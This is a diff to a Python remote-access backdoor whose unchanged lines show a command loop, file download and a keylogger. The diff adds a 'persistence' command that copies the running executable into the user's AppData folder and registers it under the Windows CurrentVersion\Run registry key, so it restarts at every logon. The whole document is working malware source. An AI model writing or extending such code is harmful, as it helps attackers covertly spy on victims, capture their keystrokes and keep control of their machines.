@@ -5,6 +5,9 @@ import os
 import pyautogui
 import keylogger
 import threading
+import shutil
+import sys
+import subprocess
 
 
 def reliable_send(data):
@@ -46,6 +49,21 @@ def download_file(file_name):
     f.close()
 
 
+def persis(reg_name, copy_name):
+    file_location = os.environ['appdata'] + '\\' + copy_name
+    try:
+        if not os.path.exists(file_location):
+            shutil.copyfile(sys.executable, file_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v '
+                            + reg_name
+                            + ' /t REG_SZ /d "' + file_location + '"', shell=True)
+            reliable_send('[+] Created persistence with reg key: ' + reg_name)
+        else:
+            reliable_send('Persistence already exists')
+    except:
+        reliable_send('Error creating persistence!')
+
+
 def shell():
     while True:
         command = reliable_recv()
@@ -77,6 +95,9 @@ def shell():
             keylog.self_destruct()
             t.join()
             reliable_send('[+] Keylogger stopped!')
+        elif command[:11] == 'persistence':
+            reg_name, copy_name = command[12:].split(' ')
+            persis(reg_name, copy_name)
         else:
             if command == 'pwd':
                 if os.name == 'nt':
